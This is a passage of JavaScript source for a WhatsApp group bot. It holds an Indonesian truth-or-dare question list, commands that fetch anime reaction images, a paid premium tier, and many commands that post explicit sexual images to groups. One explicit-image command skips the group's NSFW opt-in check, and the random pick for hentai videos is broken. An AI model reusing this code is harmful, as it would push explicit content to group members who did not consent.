        "Pernah suka sama dua orang sekaligus?",
        "Apa hal kecil yang selalu bisa bikin kamu tersenyum?",
        "Kalau kamu jadi karakter kartun, pengen jadi siapa?",
        "Pernah iri sama pencapaian orang lain?",
        "Siapa yang kamu pikirin kalau dengar kata 'rumah'?",
        "Kalau hidupmu dijadikan buku, apa judulnya?",
        "Apa hal paling konyol yang pernah kamu percaya waktu kecil?",
        "Pernah bikin janji ke diri sendiri dan gagal nepatin?",
        "Kalau kamu bisa hidup di dunia fiksi, pilih dunia apa?",
        "Siapa guru yang paling kamu inget? Kenapa?",
        "Kalau bisa makan cuma satu makanan seumur hidup, mau pilih apa?",
        "Pernah pengen banget kabur dari semua masalah?",
        "Apa hal yang kamu pengen semua orang tahu tentang dirimu?",
        "Pernah merasa 'gak cukup baik' buat seseorang?",
        "Apa kebiasaan kecil kamu yang orang lain suka?",
        "Kalau ada mesin waktu, kamu mau ke masa depan atau masa lalu?",
        "Pernah ngaku suka sesuatu cuma biar dianggap keren?",
        "Siapa yang paling sering kamu chat tanpa sadar?",
        "Pernah janji nggak akan ngelakuin sesuatu tapi akhirnya lakuin juga?",
        "Apa hal yang pengen kamu capai sebelum umur 30?",
        "Kalau disuruh pilih: uang banyak tapi kesepian, atau hidup sederhana tapi penuh cinta?",
        "Pernah suka banget sama seseorang sampai lupa dunia?",
        "Kalau kamu bisa punya skill instan, mau skill apa?",
        "Siapa teman yang pertama kali kamu percaya semua rahasia kamu?",
        "Apa kenangan kecil yang bikin kamu senyum sendiri pas inget?",
        "Pernah berharap waktu berhenti di satu momen?",
        "Kalau bisa pilih satu lagu jadi soundtrack hidup kamu, lagu apa?",
        "Apa ketakutan tersembunyi yang nggak pernah kamu omongin ke orang lain?",
        "Kalau bisa move on dari satu hal dalam hidupmu, apa itu?",
        "Siapa orang yang paling kamu kangenin saat ini?",
        "Pernah pura-pura lupa sama seseorang yang sebenarnya kamu rinduin?",
        "Kalau dikasih kesempatan mulai hidup baru dari nol, mau atau nggak?",
        "Apa impian terliar kamu yang belum pernah kamu ceritain ke siapa pun?",
        "Siapa yang menurut kamu paling tulus di hidupmu?",
        "Kalau bisa menghapus satu kebiasaan buruk kamu, apa itu?",
        "Apa arti 'bahagia' menurut kamu?",
        "Kalau harus memilih antara cinta atau karier, kamu pilih apa?",
        "Siapa yang paling banyak ngajarin kamu tentang hidup?",
        "Kalau bisa jadi hewan satu hari, mau jadi apa?",
        "Apa yang paling kamu takutkan tentang masa depan?",
        "Pernah merasa dicintai lebih dari yang kamu bayangkan?",
        "Apa pesan buat diri kamu 10 tahun lagi?",
        "Pernah nggak kamu pura-pura bahagia padahal lagi sedih?",
        "Hal paling gila apa yang pernah kamu lakukan buat seseorang?",
        "Siapa teman yang paling sering bikin kamu ketawa?",
        "Pernah suka sama orang yang gak mungkin bisa kamu dapetin?",
        "Kalau bisa menghapus satu kenangan, mau hapus yang mana?",
        "Siapa di grup ini yang paling drama queen menurutmu?",
        "Pernah mimpi aneh tentang teman sendiri?",
        "Kalau jadi karakter di film, kamu pengen jadi siapa?",
        "Pernah nangis cuma gara-gara baca chat orang?",
        "Kalau disuruh ngilangin satu kebiasaan jelek, mau apa?",
        "Siapa yang pertama kamu cari kalau kamu lagi sedih?",
        "Pernah kirim pesan ke orang yang salah? Apa isinya?",
        "Kalau punya kesempatan time travel, mau ke masa apa?",
        "Hal paling random apa yang ada di dalam kamar kamu?",
        "Siapa tokoh idola yang kamu pengen banget ketemu?",
        "Kalau punya uang tak terbatas, hal pertama yang kamu beli apa?",
        "Siapa yang paling sering kamu kepoin di sosmed?",
        "Pernah ketahuan bohong sama orang tua? Tentang apa?",
        "Kalau disuruh pilih, kamu lebih pilih teman atau pacar?",
        "Hal memalukan apa yang pengen kamu hapus dari hidupmu?",
        "Siapa teman yang kamu anggap paling sabar?",
        "Kalau bisa makan tanpa takut gemuk, makanan apa yang kamu sikat terus?",
        "Siapa yang paling sering bikin kamu malu?",
        "Pernah suka sama gebetan teman sendiri?",
        "Kalau bisa invisible sehari, mau ngapain aja?",
        "Hal paling aneh apa yang pernah kamu lakukan waktu kecil?",
        "Siapa guru yang paling berkesan buat kamu?",
        "Kalau bisa liburan gratis, mau ke mana?",
        "Hal paling norak apa yang pernah kamu lakukan pas jatuh cinta?",
        "Kalau disuruh tampil di TV, acara apa yang kamu pilih?",
        "Siapa yang menurutmu paling pintar di grup ini?",
        "Kalau kamu punya satu permintaan ajaib, kamu mau minta apa?",
        "Pernah punya pengalaman ditolak mentah-mentah?",
        "Kalau jadi miliarder, apa hal paling konyol yang mau kamu beli?",
        "Siapa yang sering bikin kamu gemes karena ngeselin?",
        "Kalau kamu jadi presiden, peraturan aneh apa yang mau kamu buat?",
        "Pernah dikatain hal aneh sama orang? Apa katanya?",
        "Kalau kamu bisa balikan sama mantan, mau nggak?",
        "Siapa orang yang pernah bikin kamu merasa spesial banget?",
        "Kalau harus pilih antara kaya tapi kesepian atau biasa aja tapi bahagia, pilih mana?",
        "Pernah salah ngirim foto ke orang? Ceritain!",
        "Kalau bisa ngerubah satu hal dari dirimu, apa?",
        "Siapa di grup ini yang menurutmu paling misterius?",
        "Kalau bisa jadi karakter anime, mau jadi siapa?",
        "Pernah kepergok ngelakuin sesuatu yang malu-maluin?",
        "Kalau kamu bisa belajar skill baru instant, mau skill apa?",
        "Hal paling absurd apa yang pernah kamu omongin pas ngelindur?",
        "Siapa yang menurut kamu paling stylish di grup ini?",
        "Kalau kamu bisa jadi hewan sehari, mau jadi hewan apa?",
        "Pernah salah panggil orang? Ceritain!",
        "Kalau punya kesempatan gila sekali seumur hidup, mau ngapain?",
        "Hal paling receh apa yang bisa bikin kamu ketawa ngakak?",
        "Kalau disuruh nonton film yang sama terus-menerus, pilih film apa?",
        "Siapa yang menurut kamu paling cuek di grup ini?",
        "Kalau bisa jago main alat musik dalam semalam, mau alat apa?",
        "Pernah bohong soal alasan gak masuk sekolah atau kerja?",
        "Kalau hidupmu dijadiin film, judulnya apa?",
        "Siapa yang kamu anggap paling romantis?",
        "Kalau kamu bisa ubah ending satu film, film apa yang mau kamu ubah?",
        "Pernah dikira kembar sama orang lain?",
        "Kalau kamu dikasih satu tiket gratis ke mana aja, pilih kemana?",
        "Siapa yang sering bikin kamu bingung sendiri?",
        "Kalau kamu bisa punya rumah di mana aja, mau di mana?",
        "Pernah nggak sih pura-pura paham padahal nggak ngerti apa-apa?",
        "Kalau kamu bisa ketemu diri kamu di masa kecil, mau bilang apa?",
        "Siapa yang kamu pikirin pas lagi bengong?",
        "Kalau harus tinggal di pulau tak berpenghuni, mau bawa siapa?",
        "Pernah nggak salah kirim pesan ke grup yang salah?",
        "Kalau dikasih kekuatan super, mau bisa baca pikiran atau teleportasi?",
        "Siapa menurutmu paling jago ngelawak?",
        "Kalau kamu punya satu hari bebas aturan, mau ngapain aja?",
        "Pernah dituduh ngelakuin sesuatu yang gak kamu lakukan?",
        "Kalau hidupmu kayak game, mau pilih karakter apa?",
        "Siapa yang paling mungkin jadi orang sukses di masa depan?",
        "Kalau kamu bisa makan makanan apa aja tanpa kenyang, pilih apa?",
        "Pernah nggak jatuh di tempat umum dan pura-pura nggak kenapa-kenapa?",
        "Kalau dikasih pilihan hidup di zaman dulu atau masa depan, pilih mana?",
        "Siapa yang paling aneh cara ketawanya?",
        "Kalau kamu bisa hapus satu kenangan buruk, mau kenangan apa?",
        "Pernah salah bales chat penting?",
        "Kalau dikasih 1 miliar tapi harus tinggal di hutan setahun, mau gak?",
        "Siapa yang selalu bisa bikin mood kamu naik?",
        "Kalau kamu bisa buat aplikasi aneh, aplikasi tentang apa?",
        "Pernah ngambek gara-gara hal sepele?",
        "Kalau kamu bisa berbicara dengan hewan, hewan apa yang pengen kamu ajak ngobrol?",
        "Siapa yang paling sering update status aneh?",
        "Kalau kamu harus hidup tanpa internet, bisa tahan berapa lama?",
        "Hal paling memalukan yang pernah terjadi di kelas?",
        "Kalau punya kesempatan jadi artis sehari, mau jadi siapa?",
        "Pernah pura-pura tidur biar gak ditanya-tanya?",
        "Kalau bisa teleport kemanapun sekarang, mau ke mana?",
        "Siapa teman yang paling absurd menurutmu?",
        "Kalau kamu jadi karakter kartun, mau jadi siapa?",
        "Pernah gak salah masuk kamar mandi umum?",
        "Kalau kamu punya kekuatan membuat orang ketawa, mau gunain buat apa?",
        "Siapa yang paling kamu harap tiba-tiba ngajak jalan bareng?",
        "Kalau kamu bisa hidup di dunia game, pilih game apa?",
        "Siapa yang paling cocok dijadiin pasangan dalam reality show?",
        "Pernah nggak sih ketiduran di tempat umum?",
        "Kalau kamu cuma bisa makan satu makanan selamanya, pilih apa?",
        "Siapa orang yang pernah mengubah hidup kamu tanpa sadar?",
        "Kalau suatu hari kamu nggak ada, apa yang pengen kamu dikenang?",
        "Apa hal kecil yang kamu syukuri minggu ini?",
        "Pernah kecewa karena berharap terlalu tinggi?",
        "Kalau bisa kasih nasihat ke semua orang, apa yang pengen kamu bilang?"
    ];
    const xeontruth = truth[Math.floor(Math.random() * truth.length)];
    XeonBotInc.sendMessage(from, { text: ' *KAMU PILIH TRUTH NIH?? OKE.....*\n' + xeontruth }, { quoted: m });
    break;
              case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    axios.get(`https://api.waifu.pics/sfw/${command}`)
        .then(({ data }) => {
            XeonBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
        })
    }
    break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    axios.get(`https://nekos.life/api/v2/img/${command}`)
        .then(({ data }) => {
            XeonBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
        })
    }
    break
case 'animeawoo':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepat':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeslap':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecuddle':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewaifu':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animenom':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefoxgirl':{
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
            await XeonBotInc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animetickle': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animegecg': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'dogwoof': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case '8ballpool': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'goosebird': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animefeed': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeavatar': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'lizardpic': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'catmeow': {
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await XeonBotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'anime': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    if (!text) return replygcxeon(`*LU NYARI ANIME APAAN CUY* ?`)
    const malScraper = require('mal-scraper')
    await XeonStickWait()
    const anime = await malScraper.getInfoFromName(text).catch(() => null)
    if (!anime) return replygcxeon(`Could not find`)
    
    let animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}*
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*`
    
    await XeonBotInc.sendMessage(m.chat, { image: { url: anime.picture }, caption: animetxt }, { quoted: m })
}
break
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
                await XeonStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)
    
    if (!m.isGroup) return XeonStickGroup()
    await XeonStickWait()
    
    var milfpath = './src/media/nsfw/milf.json'
    if (!fs.existsSync(milfpath)) return replygcxeon('File milf.json tidak ditemukan!')
    
    var ahegaonsfw = JSON.parse(fs.readFileSync(milfpath, 'utf8'))
    var xeonyresult = pickRandom(ahegaonsfw)

    XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
}
break
case 'animespank':
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await XeonBotInc.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
